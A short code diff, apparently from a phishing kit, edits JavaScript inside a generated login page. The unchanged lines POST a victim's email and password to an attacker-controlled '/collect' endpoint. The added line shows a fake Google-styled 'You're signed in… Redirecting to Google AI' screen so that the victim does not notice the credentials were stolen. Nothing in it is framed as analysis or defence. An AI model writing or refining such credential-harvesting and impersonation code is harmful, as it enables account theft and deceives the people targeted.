@@ -91,7 +91,7 @@ var x=new XMLHttpRequest();\
 x.open("POST","' + C + '/collect",true);\
 x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\
 x.send("email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p));\
-setTimeout(function(){window.close()},2000);\
+document.querySelector(".card").innerHTML="<div style=\\"text-align:center;padding:60px 20px\\"><div style=\\"font-size:36px;margin-bottom:16px\\">\\u2705</div><h1 style=\\"font-size:20px;color:#202124;font-weight:400\\">You\\u2019re signed in</h1><p style=\\"color:#5f6368;margin-top:8px\\">Redirecting to Google AI\\u2026</p></div>";\
 };\
 <\/script></body></html>';
   }
